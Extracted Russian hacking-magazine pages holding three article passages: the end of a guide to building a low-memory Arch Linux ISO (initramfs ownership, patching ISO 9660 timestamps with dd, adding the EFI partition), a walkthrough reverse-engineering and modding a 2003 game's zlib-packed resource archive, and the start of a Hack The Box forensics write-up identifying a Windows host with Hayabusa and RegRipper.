  $ genisoimage -lrJV 'ARCH_LOWRAM' -input-charset default \
    -c boot/syslinux/boot.cat -b boot/syslinux/isolinux.bin \
    -no-emul-boot -boot-load-size 4 -boot-info-table \
    -o 'arch_lowram.iso' ./isofs



КАКИЕ ВАШИ ДОКАЗАТЕЛЬСТВА?

Наступает ответственный момент испытания. Я подключил образ к виртуаль‐
ной машине, запустил... И получил то же, что и с официальным дистрибути‐
вом, —  неработающую  консоль  и  сообщение  Initramfs  unpacking
failed: write error. Какая досада! Ведь идея была хорошая!


             INFO

                            Существенно сократить время сборки и размер
                         ISO-образа для тестирования можно, если вре‐
                          менно вынести за пределы каталога isofs файл
                   isofs/arch/x86_64/airootfs.sfs, содер‐
                    жащий основную корневую файловую  систему
                             дистрибутива Arch Linux. Этот файл можно будет
                           вернуть на место после того, как будет получен
                         работоспособный образ МФС.


Я проверил выполненные операции, полученный ISO-образ — и  нигде
не обнаружил ошибки. Тогда решил запустить его с гигабайтом памяти.
Сообщений на экране стало больше, но консоль по‑прежнему не работала!
Значит, дело теперь не в объеме памяти. Это заставило меня внимательнее
прочитать диагностические сообщения... И вот отличие:



  mount: /proc: must be superuser to use mount.
         dmesg(1) may have more information after failed mount system
  call.


То есть для монтирования надо быть суперпользователем. А я тогда кто?!
Это сообщение заставило меня усомниться в своей сущности и даже помес‐
тить в сценарий init небольшую программку, выводящую значения getuid()
и geteuid(). Получив от нее два нуля, я немного успокоился, но проблема
отказа в монтировании никуда не исчезла.
   Потратив еще некоторое время на изучение официального образа МФС, я
обратил внимание на то, что владелец файлов в его CPIO-архивах — поль‐
зователь с нулевыми UID:GID. Что ж, давай попробуем команду упаковки
записать в виде



  ... cpio -R +0:+0 -oH newc ...


И знаешь что? Это помогло! Вот, кстати, как выглядит распределение памяти
на 512 Мбайт:



  $ free -h
            total    used    free    shared  buff/cache  available
  Mem:      459Mi    96Mi   6.2Mi     4.2Mi       371Mi      363Mi
  Swap:       0B      0B      0B


Но почему успех монтирования зависит от владельца файлов? Неужели...



  $ ls -l initramfs_2/usr/bin/mount
  -rwsr-xr-x 1 user user 43096 Jun  5 21:15 initramfs_2/usr/bin/mount


Ну конечно, на файле программы mount установлен бит SUID, назначающий
при ее выполнении эффективным пользователем владельца файла. И если
владелец не  является  суперпользователем, то  привилегии понижаются.
Для чего так сделано? Остается только догадываться.


НЕ ДУМАЙ О СЕКУНДАХ СВЫСОКА

Есть, правда, у нашего ISO-образа один изъян. Процесс загрузки на десять
секунд прерывается сообщением



  Waiting 10 seconds for device /dev/disk/by-uuid/2024-06-01-09-07-18-00
  ...


Но потом продолжается:



  :: Searching for '/boot/2024-06-01-09-07-18-00.uuid' in '/dev/sr0'
  :: Mounting '/dev/sr0' to '/run/archiso/bootmnt'
  ...


Дело в том, что приоритетом при определении дистрибутивного носителя
в Arch Linux будет идентификатор UUID. В случае оптического диска им будет
отметка  времени  создания  или  модификации  ISO-образа  в  формате
ГГГГММДДччммссСС. Естественно, программа сборки ISO-образа прописала
в указанные поля текущие дату и время, а тем, что загрузка таки продолжает‐
ся, мы обязаны тому, что разработчики ввели альтернативный способ обна‐
ружения дистрибутива по наличию в нем файла /boot/ГГГГ-ММ-ДД-чч-мм-
сс-СС.uuid.
   Образ в целом работает, но я решил его пересобрать с явным указанием
ожидаемых дистрибутивом отметок времени. И тут меня поджидал большой
сюрприз. Оказывается, в сообществе Arch Linux для сборки ISO-образов
предпочитают использовать программу xorriso, а не genisoimage, как это
принято  у пользователей Ubuntu. И если в xorriso есть специальный
параметр -volumedate 'uuid' ..., то возможность задать произвольные
значения даты и времени в genisoimage отсутствует напрочь.


                                     Продолжение статьи →
COVERSTORY            ← НАЧАЛО СТАТЬИ
             ARCH     ДИЕТА ДЛЯ
               LINUX
                    ЗАПУСКАЕМ ARCH
            НА КОМПЬЮТЕРАХ С МАЛЫМ
                ОБЪЕМОМ ПАМЯТИ





ГНУТЫМ ГВОЗДЯМ — ГНУТЫЙ МОЛОТОК

И все же, несмотря на то что genisoimage называют дефективной версией
mkisofs, я решил попытаться справиться с ситуацией «в режиме хакера». При‐
поминая, что у большинства файловых систем есть заголовок, запустим поиск
строки по первым мегабайтам файла ISO-образа. У меня на часах среда,
5 июня 2024 года. Поэтому:



  $ dd if=arch_lowram.iso bs=1024K count=4 | grep -abo '20240605'
  33581:20240605
  33598:20240605
  33632:20240605
  37677:20240605
  37694:20240605
  37728:20240605
  4+0 records in
  4+0 records out
  4194304 bytes (4.2 MB, 4.0 MiB) copied.


Искомая строка встречается в обработанном блоке шесть раз... Структуру
заголовка файловой системы ISO 9660 я не помню, поэтому пришло время
обратиться к документации.


        WWW

                         Неплохое описание структуры файловой системы
                      ISO 9660 ты можешь найти в вики osdev.org.


Если коротко, то первые 32 Кбайт (32 768 байт) зарезервированы для слу‐
чаев, когда образ записан не на оптический диск, а на другой носитель, нап‐
ример USB-флешку. А вот дальше идет один или несколько заголовков тома
(Volume Descriptor), по 2 Кбайт (2048 байт) каждый. С точки зрения интересу‐
ющего нас вопроса информация в заголовках расположена так:
 • +0: 0x01, CD001  ... — первичный заголовок тома (The Primary Volume
   Descriptor);
 • +813 (33581) — дата/время создания образа;
 • +830 (33598) — дата/время модификации образа;
 • +847 (33616) — дата/время устаревания образа;
 • +864 (33632) — дата/время начала действия образа.





                    Структура файла ISO-образа Arch Linux

Смотри‑ка, а смещения‑то совпадают! Вот как это выглядит на практике:



  $ dd iflag=skip_bytes if=arch_lowram.iso bs=128 skip=32768 | hexdump -C
  1+0 records in
  1+0 records out
  00000000  01 43 44 30 30 31 01 00  4c 49 4e 55 58 20 20 20
  |.CD001..LINUX   |
  00000010  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |
  |
  00000020  20 20 20 20 20 20 20 20  41 52 43 48 5f 4c 4f 57  |
  ARCH_LOW|
  00000030  52 41 4d 20 20 20 20 20  20 20 20 20 20 20 20 20  |RAM
  |
  00000040  20 20 20 20 20 20 20 20  00 00 00 00 00 00 00 00  |
  ........|
  00000050  bd cc 09 00 00 09 cc bd  00 00 00 00 00 00 00 00
  |................|
  00000060  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00
  |................|
  00000070  00 00 00 00 00 00 00 00  01 00 00 01 01 00 00 01
  |................|
  00000080


Как и предполагалось, это начало первичного заголовка тома. Теперь давай
посмотрим на его участок с полями отметок времени. Из документации мож‐
но узнать формат каждого такого поля: ГГГГММДДччммссССZ, где СС —
десятичные разряды сотых долей секунды, Z — байт, содержащий смещение
часового пояса в 15-минутных интервалах.



  $ dd iflag=skip_bytes if=arch_lowram.iso bs=128 skip=33581 | hexdump -C
  1+0 records in
  1+0 records out
  00000000  32 30 32 34 30 36 30 35  31 31 31 31 30 39 30 30
  |2024060511110900|
  00000010  f0 32 30 32 34 30 36 30  35 31 31 31 31 30 39 30
  |.202406051111090|
  00000020  30 f0 30 30 30 30 30 30  30 30 30 30 30 30 30 30
  |0.00000000000000|
  00000030  30 30 00 32 30 32 34 30  36 30 35 31 31 31 31 30
  |00.2024060511110|
  00000040  39 30 30 f0 01 00 20 20  20 20 20 20 20 20 20 20  |900...
  |
  00000050  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |
  |
  *
  00000080


Следующие 2048 байт содержат информацию загрузчика El Torito, которая
в данный момент не представляет для нас интереса.



  $ dd iflag=skip_bytes if=arch_lowram.iso bs=128 skip=34816 | hexdump -C
  1+0 records in
  1+0 records out
  00000000  00 43 44 30 30 31 01 45  4c 20 54 4f 52 49 54 4f  |.CD001.EL
  TORITO|
  00000010  20 53 50 45 43 49 46 49  43 41 54 49 4f 4e 00 00  |
  SPECIFICATION..|
  00000020  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00
  |................|
  *
  00000040  00 00 00 00 00 00 00 40  00 00 00 00 00 00 00 00
  |.......@........|
  00000050  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00
  |................|
  *
  00000080


В третьем 2048-байтном блоке мы находим заголовок Joliet — специфи‐
кации, разработанной Microsoft для хранения имен файлов длиной до 64 сим‐
волов в двухбайтном формате Unicode.



  $ dd iflag=skip_bytes if=arch_lowram.iso bs=128 skip=36864 | hexdump -C
  1+0 records in
  1+0 records out
  00000000  02 43 44 30 30 31 01 00  00 4c 00 49 00 4e 00 55
  |.CD001...L.I.N.U|
  00000010  00 58 00 20 00 20 00 20  00 20 00 20 00 20 00 20  |.X. . . . .
  . . |
  00000020  00 20 00 20 00 20 00 20  00 41 00 52 00 43 00 48  |. . . .
  .A.R.C.H|
  00000030  00 5f 00 4c 00 4f 00 57  00 52 00 41 00 4d 00 20
  |._.L.O.W.R.A.M. |
  00000040  00 20 00 20 00 20 00 20  00 00 00 00 00 00 00 00  |. . . .
  ........|
  00000050  bd cc 09 00 00 09 cc bd  25 2f 45 00 00 00 00 00
  |........%/E.....|
  00000060  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00
  |................|
  00000070  00 00 00 00 00 00 00 00  01 00 00 01 01 00 00 01
  |................|
  00000080


По структуре этот заголовок совпадает с рассмотренным выше первичным
заголовком.



  $ dd iflag=skip_bytes if=arch_lowram.iso bs=128 skip=37677 | hexdump -C
  1+0 records in
  1+0 records out
  00000000  32 30 32 34 30 36 30 35  31 31 31 31 30 39 30 30
  |2024060511110900|
  00000010  f0 32 30 32 34 30 36 30  35 31 31 31 31 30 39 30
  |.202406051111090|
  00000020  30 f0 30 30 30 30 30 30  30 30 30 30 30 30 30 30
  |0.00000000000000|
  00000030  30 30 00 32 30 32 34 30  36 30 35 31 31 31 31 30
  |00.2024060511110|
  00000040  39 30 30 f0 01 00 20 20  20 20 20 20 20 20 20 20  |900...
  |
  00000050  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |
  |
  *
  00000080


Итак, наша задача состоит в том, чтобы поменять в файле arch_lowram.iso
значение 2024060511110900 на 2024060109071800. Для этого сгодится ути‐
лита dd:



  $ for offset in 33581 33598 33632 37677 37694 37728 ; \
    do echo '2024060109071800' | dd conv=nocreat,notrunc oflag=seek_bytes
  \
    of=arch_lowram.iso bs=16 count=1 seek=$offset ; \
    done
  ...
  1+0 records in
  1+0 records out
  16 bytes copied


Исправленный таким образом дистрибутив загружается без остановок. Но он
все еще несовершенен. В таком виде он пригоден только для загрузки
на BIOS-системах, а для использования на компьютерах с UEFI надо будет
добавить образ системного раздела EFI (EFI System Partition, ESP).


       ddСекреты
Очевидная «звезда» сегодняшнего обзора — утилита dd. История про‐
исхождения ее названия покрыта мраком, но большинство склоняется к вер‐
сии о его истоках в операторе DD (Data Definition, определение данных) языка
управления заданиями JCL операционной системы OS/360.
  В современных операционных системах к команде dd прибегают, когда
надо взять данные из одного файла (его имя указывается в параметре if=)
и записать в другой файл (заданный параметром of=). Если то или иное имя
файла не указано, то вместо него используется соответствующий стандар‐
тный поток: stdin или stdout.
  По умолчанию данные передаются отдельными байтами, но гораздо быс‐
трее производить обмен более крупными порциями — блоками. Размер бло‐
ка указывается в параметре bs=, а количество блоков — в параметре count=.
   Смещение относительно начала входного файла может быть задано
параметром skip=, а относительно выходного файла — параметром seek=.
Не совсем очевидный момент заключается в том, что по умолчанию эти сме‐
щения  должны  быть  указаны  в  количестве  блоков.  Чтобы  отменить
это положение, надо явным образом указать, что смещения указываются
в байтах, — с помощью параметра iflag=skip_bytes для входного файла
и oflag=seek_bytes — для выходного.
   Чтобы записать данные в середину существующего файла, не повредив
остальное его содержимое, надо указать флаги, предотвращающие как обну‐
ление размера файла, так и его усечение после записи, с помощью парамет‐
ра conv=nocreat,notrunc.



ОКОНЧАТЕЛЬНАЯ ОБРАБОТКА

В случае с Ubuntu добавить поддержку UEFI не составляло труда: файл efi.
img лежит в каталоге boot/grub дистрибутива, надо лишь добавить соответс‐
твующую строку в команду genisoimage. Но разработчики Arch Linux решили
не делать образ ESP доступным через файловую систему дистрибутива.
Поэтому нам придется извлекать его из ISO. К счастью, сделать это не очень
трудно. Давай посмотрим, что представляет собой файл официального дис‐
трибутива Arch Linux:



  $ file archlinux-2024.06.01-x86_64.iso
  archlinux-2024.06.01-x86_64.iso: DOS/MBR boot sector;
  partition 2 : ID=0xef, start-CHS (0x3b6,0,1), end-CHS (0x3ff,63,32),
  startsector 1945600, 335872 sectors


В главной загрузочной записи MBR содержатся сведения о нужном нам раз‐
деле ESP — об этом недвусмысленно говорит идентификатор файловой сис‐
темы 0xEF. Зная начальный сектор и размер, извлечь его из образа не сос‐
тавит труда:



  $ dd if=archlinux-2024.06.01-x86_64.iso of=efi_boot.img bs=512
  skip=1945600 count=335872
  335872+0 records in
  335872+0 records out
  171966464 bytes copied


Проверим полученный результат:



  $ file efi_boot.img
  efi_boot.img: DOS/MBR boot sector, code offset 0x58+2, OEM-ID
  "mkfs.fat",
   Media descriptor 0xf8, sectors/track 32, heads 16, sectors 335872
  (volumes > 32 MB),
   FAT (32 bit), sectors/FAT 2584, serial number 0x4fbea4f9, label:
  "ARCHISO_EFI"


Можно даже примонтировать его к файловой системе и посмотреть содер‐
жимое:


mkdir /tmp/efi_boot_img
sudo mount -t vfat -o ro,loop efi_boot.img /tmp/efi_boot_img
ls /tmp/efi_boot_img



  arch  boot  EFI  loader  shellia32.efi  shellx64.efi


И тут у меня возникло подозрение...



  $ ls /tmp/efi_boot_img/arch/boot/x86_64
  initramfs-linux.img  vmlinuz-linux


Так и есть! В образе ESP лежит копия образа МФС initramfs-linux.img,
которую по‑хорошему тоже надо заменить исправленной. А можно и не
заменять, если предположить, что компьютеры с UEFI, которые нам встретят‐
ся, будут обладать достаточным объемом памяти.
  На этом завершим краткое знакомство с ESP:


sudo umount /tmp/efi_boot_img
rmdir /tmp/efi_boot_img

Вернемся к интеграции ESP в исправленный дистрибутивный образ. Помес‐
тим его в каталог isofs/boot, чтобы он был виден программе genisoimage:


chmod u+w isofs/boot
mv efi_boot.img isofs/boot/

И сгенерируем новый ISO-образ вот такой командой:



  $ genisoimage -lrJV 'ARCH_LOWRAM' -input-charset default \
    -c boot/syslinux/boot.cat -b boot/syslinux/isolinux.bin \
    -no-emul-boot -boot-load-size 4 -boot-info-table \
    -eltorito-alt-boot -e boot/efi_boot.img -no-emul-boot \
    -o arch_lowram.iso ./isofs
  ...
  642237 extents written (1254 MB)


Чтобы образ работал не только с оптических дисков, но и с USB-носителей,
надо сделать его гибридным:



  $ isohybrid arch_lowram.iso
  isohybrid: Warning: more than 1024 cylinders: 1255
  isohybrid: Not all BIOSes will be able to boot this device


Не забудь, что у только что созданного образа прописаны «свежие» отметки
даты и времени и их надо восстановить, как было рассмотрено выше.


КУДА ТЫ, ТРОПИНКА, МЕНЯ ПРИВЕЛА?

Итак, мы наконец собрали полноценный дистрибутивный носитель Arch Linux,
который можно использовать на компьютерах с 512 Мбайт ОЗУ. На нашем
пути встретилось несколько трудностей, которые мы преодолели с помощью
минимального набора  инструментов, имеющихся в любом  дистрибутиве
GNU/Linux. По дороге мы не упустили случая познакомиться со структурой
файловой системы ISO 9660. В заключение можно сказать, что дальнейшая
рациональная фрагментация образа МФС может обеспечить работу дистри‐
бутива и на меньших объемах памяти. Например, при 384 Мбайт загрузка
прерывается с сообщением



  :: Mounting '/dev/sr0' to '/run/archiso/bootmnt'
  mount: /run/archiso/bootmnt: unknown filesystem type 'iso9660'


Из‑за ошибки распаковки МФС на ранней стадии  оказался недоступен
модуль isofs, где реализована поддержка файловой системы ISO 9660, хотя
консоль работает как ни в чем не бывало, что даже в такой конфигурации
делает дистрибутив не совсем бесполезным.
   Напоследок хотелось бы заметить, что тенденция складывать в МФС все
что ни попадя идет вразрез с изначальным замыслом МФС. Напомню, что он
состоял в предоставлении ядру Linux средств и инструментов (драйверов
и утилит) для поиска и подключения основной корневой файловой системы
на раннем этапе загрузки.
   Основная корневая файловая система располагается на внешнем устрой‐
стве, почти не претендует на оперативную память и практически не имеет
ограничений на свой объем. На дистрибутивных носителях ее образ рас‐
полагается в непосредственной близости от ядра, методы ее обнаружения
известны и хорошо отработаны. Поэтому не видно никаких объективных при‐
чин заполнять МФС файлами, не имеющими отношения к ее основной
задаче.
   Однако, как мы в очередной раз убедились, по этой скользкой тропинке
уже довольно давно дружно шагают многие популярные дистрибутивы.
ВЗЛОМ





Можно ли модифицировать любимую игру
без   дизассемблера?   Запросто.  Тебе
понадобятся лишь Hex-редактор и несколь‐
ко хитрых приемов, которыми я поделюсь
в этой статье. Мы рассмотрим, как взла‐             mr.grogrig                                                                      Ищу работу, "резюме" по
мывать  неизвестные  форматы  файлов,                ссылке:                                                                                            mr.grogrig@gmail.com
на примере всемирно признанного шедев‐
ра — игры «Ядерный титбит».


Во многих играх ресурсы упакованы в специальный файл — игровой архив.
Здесь могут лежать модели, текстуры, скрипты, анимация, звуки и прочее.
Некоторые разработчики не запариваются и используют  ZIP,  разве что
для минимальной маскировки меняют расширение на какой‑нибудь про‐
извольный набор букв.
   Сейчас почти все игры делаются на одном из популярных движков, но в
начале двухтысячных разработчики еще частенько делали всё с нуля. У мно‐
гих фирм были свои уникальные наработки, которые ложились в основу одной
или нескольких игр. Потрошить игры на таких движках намного интереснее,
чем ковырять ассеты популярных движков, для которых полно готового инс‐
трументария.


SweetScape 010 Editor
Кто‑то скажет, что главный инструмент хакера — его мозги. И будет прав.
Но на  втором  месте — удобный  Hex-редактор. Я горячо рекомендую
SweetScape  010  Editor.  Редактор  кросс‑платформенный:  есть  версии
для Windows, Linux и macOS.
   Дальше в статье я буду активно использовать встроенный  Inspector,
который интерпретирует байты как числа, даты или ассемблерные опкоды.
Кликаешь на интересующий тебя байт и видишь, чем он может быть. Также
часто бывает нужна «линейка» — выделяешь мышкой данные и узнаёшь рас‐
стояние между структурами.



ФОРМАТ С КИСЛОТНЫМ ПРИВКУСОМ

Сегодня  продегустируем «Ядерный  титбит», игру 2003 года, созданную
при участии Дани Шеповалова.
   Догадаться, какой из файлов в папке игры — это архив с ресурсами, мож‐
но,  просто  глянув на  размеры. QUEST.ezd самый большой и занима‐
ет 216 Мбайт. Это явно наш клиент. Открываем его в Hex-редакторе:


0000h: 65 7A 64 FF 4D 08 00 00 3D 75 02 00 D6 9A 82 0D  ezd.
M...=u..Öš‚.
0010h: 64 6F 6F 72 5F 30 31 2E 6D 65 61 74 00 00 02 00  door_01.
meat....
0020h: 00 00 3D 75 02 00 E1 1C 00 00 09 0A 00 00 64 6F  ..=u..á......
.do
0030h: 6F 72 5F 30 32 2E 6D 65 61 74 00 00 02 00 00 00  or_02.
meat......
0040h: 46 7F 02 00 95 21 00 00 53 0B 00 00 64 6F 6F 72  F...•!..S...
door
0050h: 5F 30 33 2E 6D 65 61 74 00 00 02 00 00 00 99 8A  _03.
meat......™Š
0060h: 02 00 71 20 00 00 0F 0B 00 00 64 6F 6F 72 5F 30  ..q ......
door_0

Обычно первые четыре байта содержат сигнатуру формата. Здесь мы видим
строку ezd., что совпадает с расширением файла. Значит, это сигнатура.
Если нет явных противоречий, продолжаем разбор с шагом в четыре байта.
Структуры часто выравниваются по INT32.
   Следующие четыре байта: 0x4D080000. Программа собрана для x86,
поэтому  числа записаны в обратном  порядке  байтов. Таким  образом,
0x4D080000 интерпретируется как 0x0000084D, что в десятичной системе
равно 2125. Что это может быть? Возможно, заголовок архива содержит чис‐
ло файлов. Две тысячи — вполне адекватное число. Проверим эту гипотезу
позже.
   Далее идет 0x3D750200, это декодируется в число 161 085, что составля‐
ет 157 Кбайт. Это может быть размер текущей структуры или смещение
начала следующей. Действительно, по адресу 161 085 заканчивается список
строк, похожих на имена файлов.
   Следующий DWORD — 0xD69A820D, что эквивалентно 226 663 126.
Это точно размер файла — 226 663 126 байт.


0x00     657A64FF     ezd.          Сигнатура формата
0x04     4D080000     2125          Возможно, количество файлов
0x08     3D750200     161085        Неизвестное смещение
0x0C     D69A820D     226663126     Размер файла

Опыт подсказывает, что на 16-м байте файловый заголовок заканчивается.
Дальше следуют строки, перемешанные с неизвестными числами. Скорее
всего, это массив структур, описывающих конкретные файлы. Попробуем
определить размер и назначение всех полей.
   Первая структура начинается с ASCII-строчки door_01.meat. Если размер
строки заранее не указан, значит, она читается до нулевого байта. До начала
следующей строки 18 байт. Расстояние между случайными строками не меня‐
ется, следовательно, это значимые поля.
   Сравнивая предполагаемые структуры, замечаем после каждой строки
шесть неизменных значений 0x000002000000. Считаем их константой. Оста‐
ется понять назначение 12 изменяемых байтов.


0x10     646F6F725F30312E6D656174     door_01.meat
0x1C     000002000000                 const
0x22     3D750200                     161085
0x26     E11C0000                     7393
0x2A     090A0000                     2569

Что сразу бросается в глаза? Во‑первых, число 161 085 совпадает со сме‐
щением из файлового заголовка. Вероятно, это адрес с данными первого
файла. Следующие два числа могут быть размером и контрольной суммой.
Смещение второго файла — 163 654. Вычитая смещение первого, получа‐
ем 2569. Значит, это поле с размером данных.
  Мы уже знаем название, смещение и размер каждого файла. Попробуем
сохранить файл  известного  формата.  Например,  gameboom.xml  лежит
по смещению 226 662 685 и имеет размер 441 байт. Любопытно! Это пос‐
ледний файл в архиве. Сложив адрес и размер, получаем смещение конца
файла. Значит, предположения верны. Но вместо ожидаемого XML видим
мусор. Данные зашифрованы или сжаты. Сравним с любым другим XML-фай‐
лом. Первые два байта совпадают. Гуглим 0x78DA и понимаем, что это сиг‐
натура zlib:


0x7801  zlib No Compression/low
0x789C  zlib Default Compression
0x78DA  zlib Best Compression

Итак, формат пал. Проверяем, что zlib работает.


import zlib


in_str = '78 DA 63 60 60 62 80 01 46 20 94 60 40 02 21 41 A1 AE 61
9E C1 9E FE 7E BA 11 6E 9E 3E AE 7A 0C 00 36 EA 05 08'


data = bytes.fromhex(in_str)
out = zlib.decompress(data)


with open('black.TGA', "wb") as output:
    output.write(out)

Повторяем с door_01.meat. Распакованный файл занимает 7393 байта. Вот
что значило то неизвестное поле.


БЫСТРАЯ ПРОВЕРКА СТРУКТУР

Перед тем как писать скрипт, стоит проверить наши догадки в Hex-редакторе.
010 Editor использует C-подобный язык для шаблонов и скриптов, что поз‐
воляет оперативно проверять предположения о структуре файла. Кривой
шаблон вылетает за границу конца файла или интерпретирует поля одной
из структур с ошибками. А мы получаем некоторую связь с реальностью.


struct ITEM_HEADER
{
    local int name_len = Strlen(ReadString(startof(this)));


    CHAR Name[name_len];
    BYTE Const[6] <format=hex>;   // 00 00 02 00 00 00
    DWORD Offset;
    DWORD UnPackedSize ;
    DWORD PackedSize;
};


string read_file_name(ITEM_HEADER & h)
{
    return h.Name;
}


struct FILE_HEADER
{
    DWORD Signature  <format=hex>;  // 'ezd\xff'
    DWORD FileCount;
    DWORD EndOfHeaders;
    DWORD FileSize;
};


FILE_HEADER head <open=true>;


ITEM_HEADER files[head.FileCount] <optimize=false, read=
read_file_name>;

Мы не узнаем размер ITEM_HEADER, пока не подсчитаем длину строки. Заг‐
лянув в справку, находим нужные функции API. К счастью, скрипты работают
даже внутри шаблонов. Чтобы переменная не отобразилась как часть струк‐
туры, ставим перед ней local. Мы вправе обращаться из одной структуры
к другой, как это сделано в files[head.FileCount].
  В  треугольных  скобках  указываются  параметры  отображения полей
или структуры целиком:
 • <format=hex> показывает строку байтов вместо числа;
 • <open=true> раскрывает структуру при каждом исполнении скрипта;
 • <optimize=false> отключает оптимизацию. Иначе массив будет сос‐
   тоять из копий первого элемента;
 • <read=read_file_name> — имя функции, дающей структуре значение,
   в нашем деле — имя файла.

Применяем шаблон нажатием на F5 и наслаждаемся результатом.





                          Формат файла EZD

Спускаемся к последней структуре и видим, что записей о файлах намного
больше. Но они не имеют ссылок на данные и содержат исходный путь. Нап‐
ример:


D:\HoloSpace3D\maket\1\MEAT_MAT\club-bar02\bar02stol.meat

Видимо, их оставили для отладки. Как и предполагалось, рабочих файлов
ровно 2125. Формат полностью разобран.


ПИШЕМ ФИНАЛЬНЫЙ СКРИПТ

Осталось накидать скрипт, который будет извлекать файлы.


import os
import zlib
import struct


from collections import namedtuple


FILE_HEADER = namedtuple('FILE_HEADER', ['Signature', 'FileCount',
'EndOfHeaders', 'FileSize'])
ITEM_HEADER = namedtuple('ITEM_HEADER', ['Name', 'Const', 'Offset',
'UnPackedSize', 'PackedSize'])


os.makedirs('files', exist_ok = True)


with open('QUEST.ezd', "rb") as input:


    data = input.read()
    file_header = FILE_HEADER(*struct.unpack('LLLL', data[0:16]))
    offset = 16


    for i in range(file_header.FileCount):


        name_end = data.find(b'\x00', offset)
        name_len = name_end - offset


        struct_end = name_end + 18
        struct_body = data[offset:struct_end]
        item_header = ITEM_HEADER(*struct.unpack(f'<{name_len}s6sLLL'
, struct_body))


        file_body = data[item_header.Offset:item_header.Offset +
item_header.PackedSize]
        unpacked = zlib.decompress(file_body)


        file_name = item_header.Name.decode('utf-8')


        with open(f'files/{file_name}', "wb") as output:
            output.write(unpacked)


        offset = name_end + 18

Запускаем его, и в папке с архивом появляются ресурсы игры в первоздан‐
ном виде.


ВНОСИМ ИЗМЕНЕНИЯ

Хочешь не только вытащить ресурсы, но и побаловаться, меняя изображения
и тексты в любимой игре? Легко! Можем даже не пересобирать архив
целиком: старые файлы можно заменить новыми прямо в Hex-редакторе.
Нужно только не забыть упаковать их при помощи zlib. В этом поможет вот
такой несложный скриптик:


import zlib


file_name = 'podvor_render_cc.tga.tga'


with open(file_name, "rb") as input:


    data = input.read()
    level = 9 # Z_BEST_COMPRESSION
    packed = zlib.compress(data, level = level)
    out_name = f'{file_name}.{level}.zlib'


    with open(out_name, "wb") as output:
        output.write(packed)

Из‑за особенностей TGA-текстур мы никак не можем повлиять на размер сох‐
раняемого графическим редактором файла. Но можем уменьшить количес‐
тво используемых цветов, что повысит эффективность сжатия и поможет zlib
создавать файлы меньшего размера.
   Диалоги хранятся в XML. Нам опять же понадобится вписаться в границы
старого размера, поэтому сократим текст в произвольном месте. Заменяем
файлы и пробуем распаковать архив прошлым скриптом. Ошибок не най‐
дено, значит, все работает!





                   Первый мод для «Ядерного титбита»


ВЫВОДЫ

Как видишь, для взлома полезно понимать, какие данные могут храниться
в исследуемом контейнере. Этим методом можно вскрывать ресурсы к боль‐
шинству игр. Впрочем, применения могут быть и менее безобидными. Изме‐
нение ресурсов иногда может привести и к выполнению произвольного кода.
Но это уже совсем другая история.
ВЗЛОМ





Сегодня в рамках расследования инциден‐
та мы  с  тобой  проэксплуатируем  уяз‐
вимость в KeePass, найденную в 2023 году,
а затем посмотрим, как использовать инс‐
трумент ZUI для анализа артефактов.                          d3f0x0                                                                                                                 threat hunter,
                                                                                                               threat researcher

Нам предстоит пройти задание Hunter c ресурса Hack The Box Sherlocks. Его
уровень сложности — «безумный». Мы не будем давать готовых ответов
на вопросы в задании. Вместо этого сосредоточимся на процессе рассле‐
дования, чтобы ты мог при желании повторить его сам и подсмотреть в эту
статью, если вдруг зайдешь в тупик.
  В описании к инциденту сказано:

       Аналитик SOC получил предупреждение о возможных атаках  lateral
      movement и credential stuffing. После анализа алерт был подтвержден.«
      У сетевого сенсора были проблемы с производительностью, поэтому
       захвачен не весь трафик.                »
Для анализа даны:
 • дамп трафика;
 • архив с артефактами хоста, собранный утилитой KAPE.

В  процессе анализа заполним  карточку  инцидента и составим  Incident
Response Plan (IRP) в IRIS.


СОБИРАЕМ ИНФОРМАЦИЮ О СИСТЕМЕ

Для получения информации об имени анализируемого хоста воспользуемся
утилитой Hayabusa:


./hayabusa computer-metrics --rules-config ../config/ -d ~/C/

Утилита проанализирует события журналов Windows и предложит несколько
вариантов, с частотой их упоминания:
 • Forela-Wkstn002.forela.local — 97 385 упоминаний;
 • DESKTOP-H72HB4B — 6861 упоминание;
 • Forela-Wkstn002 — 6087 упоминаний;
 • FORELA-WKSTN002 — 4 упоминания.

Можем предположить, что имя DESKTOP-H72HB4B было до ввода машины
в домен.
   Больше информации мы получим из реестра, для этого воспользуемся
утилитой RegRipper3.0 и плагинами.


winver
Ветка реестра:


HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\

Команда:


regripper -p winver -r CONFIG

Вывод:


ProductName               Windows 10 Pro N
ReleaseID                 2009
BuildLab                  19041.vb_release.191206-1406
BuildLabEx                19041.1.amd64fre.vb_release.191206-1406
CompositionEditionID      EnterpriseN
RegisteredOrganization
RegisteredOwner           CyberJungle
InstallDate               2023-03-07 13:14:17Z
InstallTime               2023-03-07 13:14:17Z


networklist
Ветка реестра:


HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\NetworkList\
Profiles\ProfileName\

Команда:


regripper -p networklist -r CONFIG

Вывод:


Network 2
  Key LastWrite    : 2023-06-21 11:17:27Z
  DateLastConnected: 2023-06-21 16:17:27
  DateCreated      : 2023-04-12 21:20:50
  DefaultGatewayMac: 00-50-56-EE-C1-2F
  Type             : wired


forela.local
  Key LastWrite    : 2023-06-21 11:47:27Z
  DateLastConnected: 2023-06-21 16:47:27
  DateCreated      : 2023-03-08 03:25:47
  DefaultGatewayMac: 00-50-56-EB-C1-1A
  Type             : wired


Network
  Key LastWrite    : 2023-04-12 09:16:14Z
  DateLastConnected: 2023-04-12 14:16:14
  DateCreated      : 2023-03-07 17:51:47
  DefaultGatewayMac: 00-50-56-EB-C1-1A
  Type             : wired



Domain/IP forela.local


compname
Ветка реестра:


HKLM\SYSTEM\CurrentControlSet\Control\ComputerName\

Команда:


regripper -p compname -r SYSTEM

Вывод:


ComputerName    = forela-wkstn002
TCP/IP Hostname = Forela-Wkstn002


ips
Ветка реестра:


HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces

Команда:


IPAddress 172.17.79.131

Результаты:
 • домен — forela.local;
 • хост — forela-wkstn002;
 • IP — 172.17.79.131.

Добавляем все найденное в IRIS.





                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ
